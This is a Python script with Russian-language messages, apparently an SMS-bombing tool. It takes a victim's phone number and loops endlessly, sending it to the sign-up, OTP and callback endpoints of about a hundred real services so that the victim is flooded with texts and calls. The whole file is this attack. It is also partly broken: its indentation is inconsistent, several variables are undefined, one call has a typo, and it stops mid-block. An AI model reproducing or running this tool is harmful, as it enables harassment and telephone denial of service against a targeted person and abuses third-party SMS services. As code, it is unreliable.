import os, sys, time, requests, random

from modules import start

os.system("clear")
print(start.banner)

_name = ""
_phone9 = ""

phone = ""
try:
    phone = sys.argv[1]
except:
    phone = input("Введите номер (форматы : 79(ru), 380(ua),77(kz),375(byn),374(arm),48(pl),44(ua)) +")

_phone = phone

os.system("clear")
print(start.banner)
print("Атака началась на номер:", phone)
for x in range(12):
    _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

_phone9 = _phone[1:]
_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
s = 0
iteration = 0

while True:
    _email = _name+f'{iteration}'+'@gmail.com'
    email = _name+f'{iteration}'+'@gmail.com'
    try:
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
            print('[+] Grab отправлено!')
        except:
            print('[-] Не отправлено!')

        try:
            requests.post('https://api.chef.yandex/api/v2/auth/sms', json={"phone": _phone})
            print('[+] chef отправлено!')
        except:
            print(' [-] Не отправлено!') 
            
        try:
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
            print(' [+] lenta отправлено!')
        except:
            print('[-] Не отправлено!') 
          
        try:
            requests.post('https://dostavista.ru/backend/send-verification-sms', data={"phone": _phone})
            print('[@'+str(bt_username)+'] [+] dos отправлено!')
        except:
            print(' [-] Не отправлено!') 
            
        try:
            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
            print(' [+] RuTaxi отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
            print(' [+] BelkaCar отправлено!')
        except:
            print(' [-] Не отправлено!')
        
        try:
            requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone})
            print(' [+] secure отправлено!')
        except:
            print(' [-] Не отправлено!')
            
        try:
            requests.post('https://cabinet.planetakino.ua/service/sms', params={"phone": _phone})
            print(' [+] planetakino отправлено!')
        except:
            print(' [-] Не отправлено!')    
            
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            print(' [+] pmsm отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
            print(' [+] ivi отправлено!')
        except:
            print(' [-] Не отправлено!')        
        
        try:
            requests.get('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone})
            print(' [+] finam отправлено!')
        except:
            print(' [-] Не отправлено!')
        
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            print(' [+] mtstv отправлено!')
        except:
            print(' [-] Не отправлено!')
            
        try:
            requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone})
            print(' [+] games отправлено!')
        except:
            print(' [-] Не отправлено!')   
            
        try:
            requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone})
            print(' [+] kasta отправлено!')
        except:
            print(' [-] Не отправлено!')      
            
        try:
            requests.post('https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/', data={"RECALL": "Y", "BACK_CALL_PHONE": _phone})
            print(' [+] ritm отправлено!')
        except:
            print(' [-] Не отправлено!')
            
        try:
            requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone})
            print(' [+] city24 отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] Не отправлено!')    
            
        try:
            requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone})
            print(' [+] sushi-master отправлено!')
        except:
            print(' [-] Не отправлено!')
            
        try:
            requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
            print(' [+] plex отправлено!')
        except:
            print(' [-] Не отправлено!')    

        try:
            requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone})
            print(' [+] vsk отправлено!')
        except:
            print(' [-] Не отправлено!')
            
            
            
            
        try:
            requests.get('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20326-87-32', data={"phone": _phone})
            print(' [+] sportmaster отправлено!')
        except:
            print(' [-] Не отправлено!')
            
        try:
            requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
            print(' [+] korona отправлено!')
        except:
            print(' [-] Не отправлено!')
        
        try:
            requests.post('https://btfair.site/api/user/phone/code', json={"phone": "+" + _phone,})
            print(' [+] btfair отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] Не отправлено!')
            
        try:
            requests.post('https://thehive.pro/auth/signup', json={"phone": "+" + _phone,})
            print(' [+] thehive отправлено!')
        except:
            print(' [-] Не отправлено!')
        
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
            print(' [+] Tinder отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
            print(' [+] Karusel отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
            print(' [+] Tinkoff отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            print(' [+] MTS отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            print(' [+] Youla отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
            print(' [+] PizzaHut отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
            print(' [+] Rabota отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
            print(' [+] Rutube отправлено!')
        except:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
            print(' [+] Citilink отправлено!')

        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
            print(' [+] Smsint отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
            print(' [+] oyorooms отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
            print(' [+] MVideo отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
            print(' [+] newnext отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
            print(' [+] Sunlight отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
            print(' [+] alpari отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            print(' [+] Invitro отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
            print(' [+] Sberbank отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
            print(' [+] Psbank отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
            print(' [+] Beltelcom отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
            print(' [+] Karusel отправлено!')
        except:
            print(' [-] Не отправлено!')
            
        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
            print(' [+] KFC отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
            print(' [+] carsmile отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
            print(' [+] Citilink отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            print(' [+] Delitime отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
            print(' [+] findclone звонок отправлен!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
            print(' [+] ICQ отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
            print(' [+] InDriver отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
            print(' [+] Invitro отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
            print('[@'+str()+'] [+] Pmsm отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
            print(' [+] IVI отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
            print(' [+] Mail.ru отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
            print(' [+] MVideo отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
            print(' [+] OK отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://plink.tech/register/',json={"phone": _phone})
            print(' [+] Plink отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone})
            print(' [+] qlean отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
            print(' [+] SMSgorod отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
            print(' [+] Tinder отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
            print(' [+] Twitch отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
            print(' [+] CabWiFi отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
            print(' [+] wowworks отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
            print(' [+] Eda.Yandex отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
            print(' [+] Youla отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": _phone, "deliveryOption": "sms"})
            print(' [+] Alpari отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
            print(' [+] SMS отправлено!')
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
            print(' [+] Delivery отправлено!')
        except:
            print(' [-] Не отправлено!')
            
        

        try:
            requests.post("https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/",
            data={"RECALL": "Y", "BACK_CALL_PHONE": _phone},headers=standar_headers,proxies=proxies)
            print(' [+]ritm отправлено')
        except:
            pass
        
        try:
            requests.post("https://www.flipkart.com/api/5/user/otp/generate",
            headers={
                "Origin": "https://www.flipkart.com",
                "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
            },
            data={"loginId": "+" + _phone})
            print(' [+] FlipKart отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://www.flipkart.com/api/6/user/signup/status",
            headers={
                "Origin": "https://www.flipkart.com",
                "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
            },
            json={"loginId": "+" + _phone, "supportAllStates": True})
            print(' [+] FlipKart отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
            

        try:
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
            print(' [+] Inv отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})
            print(' [+] Sber отправлено!')
        except:
            print(' [-] Не отправлено!')

        try:
            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
            print(' [+] RuTaxi sent!')
        except:
            print(' [-] error in sent!')

        try:
            requests.post("https://my.citrus.ua/api/v2/register", data={"email": email, "name": "Артем", "12phone": _phone, "password": password, "confirm_password": password})
            print("[+] Регестрация на Citrus отправлена!")
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://my.citrus.ua/api/auth/login", {"identity": _phoneCitrus})
            print("[+] Citrus отправлено!")
        except:
            print("[-] не отправлено!")

        try:
            requests.post("https://my.modulbank.ru/api/v2/registration/nameAndPhone",
            json={"FirstName": "Артем", "CellPhone": _phone, "Package": "optimal"})
            print(' [+] отправлено!')
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://www.moyo.ua/identity/registration",
            data={
                "firstname": "Артем",
                "phone": _phone,
                "email": _email
            }
        )
            print(' [+] Moyo отправлено!')
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://comfy.ua/ua/customer/account/createPost', data={"registration_name": "Артем", "registration_phone": _phoneComfy, "registration_email": _mail})
            print(' [+] Comfy отправлено!')
        except:
             print(' [-] не отправлено!')

        try:
            requests.post("https://www.foxtrot.com.ua/ru/account/sendcodeagain?Length=12", data={"Phone": _phoneQ})
            print(' [+] FoxTrot отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://cinema5.ru/api/phone_code', data={"phone": _phonePizzahut})
            print(' [+] Cinema5 отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://www.etm.ru/cat/runprog.html",
            data={
                "m_phone": _phone,
                "mode": "sendSms",
                "syf_prog": "clients-services",
                "getSysParam": "yes",
            },
        )
            print(' [+] ETM отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://apteka.ru/_action/auth/getForm/",
            data={
                "form[NAME]": "",
                "form[PERSONAL_GENDER]": "",
                "form[PERSONAL_BIRTHDAY]": "",
                "form[EMAIL]": "",
                "form[LOGIN]": _phone585,
                "form[PASSWORD]": password,
                "get-new-password": "Получите пароль по SMS",
                "user_agreement": "on",
                "personal_data_agreement": "on",
                "formType": "simple",
                "utc_offset": "120",
            },
        )
            print(' [+] Apteka отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://ube.pmsm.org.ru/esb/iqos-phone/validate", json={"phone": _phone})
            print(' [+] отправлено!')
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://secunda.com.ua/personalarea/registrationvalidphone", data={"ph": "+" + _phone})
            print(' [+] Secunda отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("http://api.rozamira-azs.ru/v1/auth", data={"login": _phone,})
            print(' [+] rozamira-azs отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",
            params={"msisdn": _phone})
            print(' [-] отправлено!')
        except:
            print(' [-] не отправлено!')

        try:
            requests.get("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code",
            params={"number": _phone})
            print(' [+] отправлено!')
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://api.iconjob.co/api/auth/verification_code",
            json={"phone": _phone})
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://panda99.ru/bdhandlers/order.php?t={int(time())}",
            data={
                "CB_NAME": "Артем",
                "CB_PHONE": _phone88})
            print(' [-] отправлено!')
        except:
            print(' [-]не отправлено!')

        try:
            requests.post("https://auth.pizza33.ua/ua/join/check/",
            params={
                "callback": "angular.callbacks._1",
                "email": _email,
                "password": password,
                "phone": _phone,
                "utm_current_visit_started": 0,
                "utm_first_visit": 0,
                "utm_previous_visit": 0,
                "utm_times_visited": 0,
            },
        )
            print(' [+] отправлено!')
        except:
            print(' [-] отправлено!')

        try:
            requests.post( "https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": _phone})
            print(' [+] отправлено!')
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://zoloto585.ru/api/bcard/reg/",
            json={
                "name": "Андрей",
                "surname": "Гордон",
                "patronymic": "Максимович",
                "sex": "m",
                "birthdate": "11.11.1995",
                "phone": _phone585,
                "email": email,
                "city": "Москва",
            },
        )
            print(' [+] Zoloto585 отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode",
            data={"phone": _phone585},
        )
            print(' [+] Pliskov отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://www.foxtrot.com.ua/ru/account/sendcodeagain?Length=12", data={"Phone": _phoneQ})
            print(' [+] FoxTrot отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/",
            data={"RECALL": "Y", "BACK_CALL_PHONE": _phone})
        except:
            pass

        try:
            requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php",
            data={"demo_number": "+" + _phone, "ajax_demo_send": "1"},
        )
            print(' [+] Sms4 отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://www.flipkart.com/api/5/user/otp/generate",
            headers={
                "Origin": "https://www.flipkart.com",
                "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
            },
            data={"loginId": "+" + _phone})
            print(' [+] FlipKart отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://www.flipkart.com/api/6/user/signup/status",
            headers={
                "Origin": "https://www.flipkart.com",
                "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
            },
            json={"loginId": "+" + _phone, "supportAllStates": True})
            print(' [+] FlipKart отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://bamper.by/registration/?step=1",
            data={
                "phone": "+" + _phone,
                "submit": "Запросить смс подтверждения",
                "rules": "on",
            },
        )
            print(' [+] Bamper отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://friendsclub.ru/assets/components/pl/connector.php",
            data={"casePar": "authSendsms", "MobilePhone": "+" + _phone})
            print(' [+] FriendClub отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://app.salampay.com/api/system/sms/c549d0c2-ee78-4a98-659d-08d682a42b29",
            data={"caller_number": _phone})
            print(' [+] SalamPay отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://app.doma.uchi.ru/api/v1/parent/signup_start",
            json={
                "phone": "+" + _phone,
                "first_name": "-",
                "utm_data": {},
                "via": "call",
            })
            print(' [+] звонок отправлен!')
            time.sleep(0.1)
        except:
            print(' [+] не отправлен!')

        try:
            requests.post("https://app.doma.uchi.ru/api/v1/parent/signup_start",
            json={
                "phone": "+" + _phone,
                "first_name": "-",
                "utm_data": {},
                "via": "sms",
            },
        )
            print(' [+] Uchi отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php', data={ "msisdn": _phone, "locale": "en", "countryCode": "ru", "version": "1", "k": "ic1rtwz1s1Hj1O0r", "r": "46763", })
            print(' [+] ICQ отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://shafa.ua/api/v3/graphiql', json={
                "operationName": "RegistrationSendSms",
                "variables": {"phoneNumber": "+" + _phone},
                "query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n",
            },
        )
            print(' [+] Shafa отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://alpari.com/api/en/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
            headers={"Referer": "https://alpari.com/en/registration/"},
            json={
                "client_type": "personal",
                "email": _email,
                "mobile_phone": _phone,
                "deliveryOption": "sms",
            },
        )
            print(' [+] Alpari отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://uklon.com.ua/api/v1/account/code/send',
            headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},
            json={"phone": _phone},
            )
            print(' [+] Uklon отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] е отправлено!')

        try:
            requests.post('https://crm.getmancar.com.ua/api/veryfyaccount', json={ "phone": "+" + _phone, "grant_type": "password", "client_id": "gcarAppMob", "client_secret": "SomeRandomCharsAndNumbersMobile"})
            print(' [+] GetMancar отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://auth.multiplex.ua/login', json={'login': _phone})
            print(' [+] MultiPlex отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://lk.invitro.ru/sp/mobileApi/createUserByPassword', data={"password": password,"application": "lkp","login": "+" + _phone})
            print(' [+] Invitro отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://secure.ubki.ua/b2_api_xml/ubki/auth', json={"doc": {"auth": { "mphone": "+" + _phone,"bdate": "11.11.1999","deviceid": "00100", "version": "1.0","source": "site", "signature": "undefined"}}}, headers={"Accept": "application/json"})
            print(' [+] Ubki отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://www.top-shop.ru/login/loginByPhone/', data={"phone": _phonePizzahut})
            print(' [+] Top-Shop отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://www.rendez-vous.ru/ajax/SendPhoneConfirmationNew/',  data={"phone": _phonePizzahut, "alien": "0"})
            print(' [+] Rendez-Vous отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://osava.ua/users/sign-up/callbacks', data={"phone_callbacks": _phone, "send_callbacks": "Отправить"})
            print(' [+] Osova отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправено!')

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
            json={"phone_number": "+" + _phone})
            
            print(' [+] Yandex.Eda отправлено!')
            time.leep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://izi.ua/api/auth/register",
            json={
                "phone": "+" + _phone,
                "name": "Анастасия",
                "is_terms_accepted": True,
            },
        )
            print(' [+] Izi отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://izi.ua/api/auth/sms-login", json={"phone": "+" + _phone})
            print(' [+] Izzi отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://api.pozichka.ua/v1/registration/send', json={"RegisterSendForm": {"phone": _phonePozichka}})
            print(' [+] Pozichka отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
         
        try:
            requests.post('https://ontaxi.com.ua/api/v2/web/client', data={"country":"UA","phone": phone[3:]})
            print(' [+] OnTaxi отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://suandshi.ru/mobile_api/register_mobile_user', params={"phone": _phone})
            print(' [+] Suandshi отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php', data={"data": _phone, "metod": "postreg"})
            print(' [+] Makarolls отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')
        
        try:
            requests.post('https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode', data={"telephone": "8" + _phone[1:]})
            print(' [+] PanPizza отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post("https://www.moyo.ua/identity/registration", data={"firstname": "Артем", "phone": _phone,"email": email})
            print(' [+] MOYO отправлено!')
            time.sleep(0.1)
        except:
            print(' [-] не отправлено!')

        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={}, proxies=proxies)
            print(' [+] BelkaCar sent!')
            time.sleep(0.1)
        except:
            print(' [-] error in sent!')

        try:
            requests.post('https://starpizzacafe.com/mods/a.function.php', data={'aj': '50', 'registration-phone': _phone})
            print(' [+] StarPizzaCafe отправлено!')
            time.sleep(0.1)
